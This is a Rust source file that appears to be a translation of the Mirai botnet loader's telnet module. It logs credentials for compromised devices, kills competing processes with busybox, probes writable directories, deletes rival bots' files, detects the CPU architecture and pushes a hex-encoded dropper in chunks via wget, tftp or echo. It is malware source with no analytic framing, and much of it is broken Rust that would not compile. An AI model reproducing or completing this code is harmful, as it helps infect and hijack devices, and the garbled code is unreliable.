use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};
use std::net::TcpStream;
use std::io::{self, Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};

#[derive(Debug)]
struct Connection {
    lock: Mutex<()>,
    rdbuf: Vec<u8>,
    rdbuf_pos: usize,
    last_recv: SystemTime,
    timeout: Duration,
    echo_load_pos: usize,
    state_telnet: TelnetState,
    success: Arc<AtomicBool>,
    open: bool,
    bin: Option<Binary>,
    fd: Option<TcpStream>,
    srv: Option<Server>,
    info: ConnectionInfo,
}

#[derive(Debug)]
enum TelnetState {
    Connecting,
    Closed,
}

#[derive(Debug)]
struct Binary {
    hex_payloads: Vec<String>,
    hex_payloads_len: usize,
}

#[derive(Debug)]
struct ConnectionInfo {
    addr: u32,
    port: u16,
    user: String,
    pass: String,
    arch: String,
    has_arch: bool,
    writedir: String,
    upload_method: UploadMethod,
}

#[derive(Debug)]
struct Server {
    total_successes: usize,
    total_failures: usize,
    curr_open: usize,
}

#[derive(Debug)]
enum UploadMethod {
    Wget,
    Tftp,
    Echo,
}

impl Connection {
    fn open(&mut self) {
        let _guard = self.lock.lock().unwrap();

        self.rdbuf_pos = 0;
        self.last_recv = SystemTime::now();
        self.timeout = Duration::new(10, 0);
        self.echo_load_pos = 0;
        self.state_telnet = TelnetState::Connecting;
        self.success = Arc::new(AtomicBool::new(false));
        self.open = true;
        self.bin = None;
        self.echo_load_pos = 0;

        #[cfg(debug_assertions)]
        println!("[FD{:?}] Called connection_open", self.fd);
    }

    fn close(&mut self) {
        let _guard = self.lock.lock().unwrap();

        if self.open {
            #[cfg(debug_assertions)]
            println!("[FD{:?}] Shut down connection", self.fd);

            self.rdbuf.clear();
            self.rdbuf_pos = 0;
            self.open = false;
            self.success.store(false, Ordering::SeqCst);

            if let Some(srv) = &self.srv {
                if self.success.load(Ordering::SeqCst) {
                    srv.total_successes += 1;
                    eprintln!("OK|{:?} {}:{} {}:{} {}",
                        self.info.addr,
                        self.info.port,
                        self.info.user,
                        self.info.pass,
                        self.info.arch);
                } else {
                    srv.total_failures += 1;
                    eprintln!("ERR|{:?} {}:{} {}:{} {}",
                        self.info.addr,
                        self.info.port,
                        self.info.user,
                        self.info.pass,
                        self.info.arch);
                }
            }

            self.state_telnet = TelnetState::Closed;

            if let Some(fd) = self.fd.take() {
                let _ = fd.shutdown(std::net::Shutdown::Both);
            }
        }
    }

    fn consume_iacs(&mut self) -> usize {
        let mut consumed = 0;
        let mut ptr = &self.rdbuf[..];

        while consumed < self.rdbuf_pos {
            if ptr[0] != 0xff {
                break;
            } else if ptr[0] == 0xff {
                if !can_consume(&self, ptr, 1) {
                    break;
                }
                if ptr[1] == 0xff {
                    ptr = &ptr[2..];
                    consumed += 2;
                    continue;
                } else if ptr[1] == 0xfd {
                    let tmp1 = [255, 251, 31];
                    let tmp2 = [255, 250, 31, 0, 80, 0, 24, 255, 240];

                    if !can_consume(&self, ptr, 2) {
                        break;
                    }
                    if ptr[2] != 31 {
                        goto_iac_wont!(ptr);
                    }

                    ptr = &ptr[3..];
                    consumed += 3;

                    let _ = self.fd.as_mut().unwrap().write_all(&tmp1);
                    let _ = self.fd.as_mut().unwrap().write_all(&tmp2);
                } else {
                    goto_iac_wont!(ptr);
                }
            }
        }

        consumed
    }

    fn consume_login_prompt(&self) -> Option<usize> {
        self.rdbuf[..self.rdbuf_pos].iter().rposition(|&c| {
            c == b':' || c == b'>' || c == b'$' || c == b'#' || c == b'%'
        })
    }

    fn consume_password_prompt(&self) -> Option<usize> {
        self.rdbuf[..self.rdbuf_pos].iter().rposition(|&c| {
            c == b':' || c == b'>' || c == b'$' || c == b'#' || c == b'%'
        }).or_else(|| {
            let password_prompt = b"assword";
            util_memsearch(&self.rdbuf, &password_prompt)
        })
    }

    fn consume_prompt(&self) -> Option<usize> {
        self.rdbuf[..self.rdbuf_pos].iter().rposition(|&c| {
            c == b':' || c == b'>' || c == b'$' || c == b'#' || c == b'%'
        })
    }

    fn consume_verify_login(&self) -> Option<usize> {
        let token_response = b"TOKEN_RESPONSE";
        util_memsearch(&self.rdbuf, &token_response)
    }

    fn consume_psoutput(&mut self) -> usize {
        let mut start = 0;
        let mut offset = 0;

        while let Some(end) = self.rdbuf[start..].iter().position(|&c| c == b'\n') {
            let line = &mut self.rdbuf[start..start + end];
            start += end + 1;

            let mut split = line.split_mut(|&c| c == b' ' || c == b'\t');
            let pid_str = split.next().unwrap_or(&mut []);
            let proc_name = split.nth(2).unwrap_or(&mut []);

            let pid = String::from_utf8_lossy(pid_str).parse::<u32>().unwrap_or(0);
            let proc_name = String::from_utf8_lossy(proc_name);

            if pid != 1 && (proc_name == "init" || proc_name == "[init]") {
                util_sockprintf(self.fd.as_ref().unwrap(), "/bin/busybox kill -9 {}\r\n", pid);
            } else if pid > 400 && proc_name.chars().all(|c| c.is_digit(10)) {
                util_sockprintf(self.fd.as_ref().unwrap(), "/bin/busybox kill -9 {}\r\n", pid);
            }

            if start >= offset {
                offset = start;
            }
        }

        if self.rdbuf_pos > 7168 {
            self.rdbuf.drain(0..6144);
            self.rdbuf_pos -= 6144;
        }

        offset
    }

    fn consume_mounts(&mut self) -> usize {
        let mut linebuf = vec![0u8; 256];
        let mut linebuf_pos = 0;
        let token_response = b"TOKEN_RESPONSE";

        if let Some(prompt_ending) = util_memsearch(&self.rdbuf, &token_response) {
            for i in 0..prompt_ending {
                if linebuf_pos == linebuf.len() - 1 {
                    break;
                }

                if self.rdbuf[i] == b'\n' {
                    linebuf[linebuf_pos] = 0;
                    linebuf_pos = 0;
                    let parts: Vec<&str> = linebuf.split(|&c| c == b' ').collect();
                    if parts.len() >= 4 && parts[3].contains("rw") {
                        util_sockprintf(self.fd.as_ref().unwrap(), "/bin/busybox echo -e '{:?}' > {:?}/.nippon; /bin/busybox cat {:?}/.nippon; /bin/busybox rm {:?}/.nippon\r\n",
                                        VERIFY_STRING_HEX, parts[1], parts[1], parts[1]);
                    }
                } else if self.rdbuf[i] != b'\r' {
                    linebuf[linebuf_pos] = self.rdbuf[i];
                    linebuf_pos += 1;
                }
            }

            util_sockprintf(self.fd.as_ref().unwrap(), "/bin/busybox echo -e '{:?}' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
                            VERIFY_STRING_HEX);

            util_sockprintf(self.fd.as_ref().unwrap(), "TOKEN_QUERY\r\n");
            prompt_ending
        } else {
            0
        }
    }

    fn consume_written_dirs(&mut self) -> usize {
        let token_response = b"TOKEN_RESPONSE";
        if let Some(end_pos) = util_memsearch(&self.rdbuf, &token_response) {
            let mut total_offset = 0;
            while let Some(offset) = util_memsearch(&self.rdbuf[total_offset..end_pos], VERIFY_STRING_CHECK) {
                total_offset += offset;

                if let Some(mut line) = self.rdbuf[total_offset..].split(|&c| c == b'\n').next() {
                    if line.ends_with(b'\r') {
                        line = &line[..line.len() - 1];
                    }

                    util_sockprintf(self.fd.as_ref().unwrap(), "rm {0}/.t; rm {0}/.sh; rm {0}/.human\r\n", String::from_utf8_lossy(line));
                }
            }

            end_pos
        } else {
            0
        }
    }

    fn consume_copy_op(&self) -> Option<usize> {
        let token_response = b"TOKEN_RESPONSE";
        util_memsearch(&self.rdbuf, &token_response)
    }

    fn consume_arch(&mut self) -> usize {
        if !self.info.has_arch {
            if let Some(elf_start_pos) = util_memsearch(&self.rdbuf, b"ELF") {
                let elf_start_pos = elf_start_pos - 4; // Go back to ELF header

                let ehdr = unsafe { &*(self.rdbuf[elf_start_pos..].as_ptr() as *const ElfHdr) };
                self.info.has_arch = true;

                match ehdr.e_ident[EI_DATA] {
                    EE_NONE => return 0,
                    EE_BIG => {
                        #[cfg(target_endian = "little")]
                        ehdr.e_machine = u16::from_be(ehdr.e_machine);
                    }
                    EE_LITTLE => {
                        #[cfg(target_endian = "big")]
                        ehdr.e_machine = u16::from_be(ehdr.e_machine);
                    }
                }

                self.info.arch = match ehdr.e_machine {
                    EM_ARM | EM_AARCH64 => "arm".to_string(),
                    EM_MIPS | EM_MIPS_RS3_LE => {
                        if ehdr.e_ident[EI_DATA] == EE_LITTLE {
                            "mpsl".to_string()
                        } else {
                            "mips".to_string()
                        }
                    }
                    EM_386 | EM_486 | EM_860 | EM_X86_64 => "x86".to_string(),
                    EM_SPARC | EM_SPARC32PLUS | EM_SPARCV9 => "spc".to_string(),
                    EM_68K | EM_88K => "m68k".to_string(),
                    EM_PPC | EM_PPC64 => "ppc".to_string(),
                    EM_SH => "sh4".to_string(),
                    _ => {
                        self.info.arch.clear();
                        self.close();
                        return 0;
                    }
                }
            } else {
                return 0;
            }
        }

        let token_response = b"TOKEN_RESPONSE";
        util_memsearch(&self.rdbuf, &token_response).unwrap_or_else(|| {
            if self.rdbuf_pos > 7168 {
                self.rdbuf.drain(0..6144);
                self.rdbuf_pos -= 6144;
            }
            0
        })
    }

    fn consume_arm_subtype(&mut self) -> usize {
        let token_response = b"TOKEN_RESPONSE";
        if let Some(offset) = util_memsearch(&self.rdbuf, &token_response) {
            if util_memsearch(&self.rdbuf[..offset], b"ARMv7").is_some() || util_memsearch(&self.rdbuf[..offset], b"ARMv6").is_some() {
                self.info.arch = "arm7".to_string();
            }
            offset
        } else {
            0
        }
    }

    fn consume_upload_methods(&mut self) -> usize {
        let token_response = b"TOKEN_RESPONSE";
        if let Some(offset) = util_memsearch(&self.rdbuf, &token_response) {
            if util_memsearch(&self.rdbuf[..offset], b"wget: applet not found").is_none() {
                self.info.upload_method = UploadMethod::Wget;
            } else if util_memsearch(&self.rdbuf[..offset], b"tftp: applet not found").is_none() {
                self.info.upload_method = UploadMethod::Tftp;
            } else {
                self.info.upload_method = UploadMethod::Echo;
            }
            offset
        } else {
            0
        }
    }

    fn upload_echo(&mut self) -> usize {
        let token_response = b"TOKEN_RESPONSE";
        if let Some(offset) = util_memsearch(&self.rdbuf, &token_response) {
            if self.bin.is_none() {
                self.close();
                return 0;
            }

            if self.echo_load_pos == self.bin.as_ref().unwrap().hex_payloads_len {
                return offset;
            }

            util_sockprintf(self.fd.as_ref().unwrap(), "echo -ne '{}' {} " FN_DROPPER "; " TOKEN_QUERY "\r\n",
                            self.bin.as_ref().unwrap().hex_payloads[self.echo_load_pos], if self.echo_load_pos == 0 { ">" } else { ">>" });
            self.echo_load_pos += 1;

            self.rdbuf.drain(0..offset);
            self.rdbuf_pos -= offset;

            0
        } else {
            0
        }
    }

    fn upload_wget(&self) -> Option<usize> {
        let token_response = b"TOKEN_RESPONSE";
        util_memsearch(&self.rdbuf, &token_response)
    }

    fn upload_tftp(&self) -> Option<isize> {
        let token_response = b"TOKEN_RESPONSE";
        if let Some(offset) = util_memsearch(&self.rdbuf, &token_response) {
            if util_memsearch(&self.rdbuf[..offset], b"Permission denied").is_some() ||
               util_memsearch(&self.rdbuf[..offset], b"timeout").is_some() ||
               util_memsearch(&self.rdbuf[..offset], b"illegal option").is_some() {
                return Some(-(offset as isize));
            }
            Some(offset as isize)
        } else {
            None
        }
    }

    fn verify_payload(&self) -> Option<usize> {
        let exec_response = b"EXEC_RESPONSE";
        if let Some(offset) = util_memsearch(&self.rdbuf, &exec_response) {
            if util_memsearch(&self.rdbuf[..offset], b"listening tun0").is_none() {
                return Some(offset);
            }
            Some(255 + offset)
        } else {
            None
        }
    }

    fn consume_cleanup(&self) -> Option<usize> {
        let token_response = b"TOKEN_RESPONSE";
        util_memsearch(&self.rdbuf, &token_response)
    }
}

fn util_memsearch(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

macro_rules! goto_iac_wont {
    ($ptr:ident) => {
        for i in 0..3 {
            if $ptr[i] == 0xfd {
                $ptr[i] = 0xfc;
            } else if $ptr[i] == 0xfb {
                $ptr[i] = 0xfd;
            }
        }
        let _ = self.fd.as_ref().unwrap().write_all(&$ptr[..3]);
        $ptr = &$ptr[3..];
        consumed += 3;
    };
}

fn can_consume(conn: &Connection, ptr: &[u8], amount: usize) -> bool {
    ptr.len() >= amount
}

fn util_sockprintf(fd: &TcpStream, format: &str, args: impl std::fmt::Debug) {
    let _ = writeln!(fd, format, args);
}

const VERIFY_STRING_HEX: &str = "some_hex_string";
const TOKEN_QUERY: &str = "TOKEN_QUERY";
const FN_DROPPER: &str = "FN_DROPPER";
const EXEC_RESPONSE: &str = "EXEC_RESPONSE";
const VERIFY_STRING_CHECK: &str = "VERIFY_STRING_CHECK";

#[repr(C)]
struct ElfHdr {
    e_ident: [u8; 16],
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
}

const EI_DATA: usize = 5;
const EE_NONE: u8 = 0;
const EE_BIG: u8 = 1;
const EE_LITTLE: u8 = 2;
const EM_ARM: u16 = 40;
const EM_AARCH64: u16 = 183;
const EM_MIPS: u16 = 8;
const EM_MIPS_RS3_LE: u16 = 10;
const EM_386: u16 = 3;
const EM_486: u16 = 6;
const EM_860: u16 = 7;
const EM_X86_64: u16 = 62;
const EM_SPARC: u16 = 2;
const EM_SPARC32PLUS: u16 = 18;
const EM_SPARCV9: u16 = 43;
const EM_68K: u16 = 4;
const EM_88K: u16 = 5;
const EM_PPC: u16 = 20;
const EM_PPC64: u16 = 21;
const EM_SH: u16 = 42;
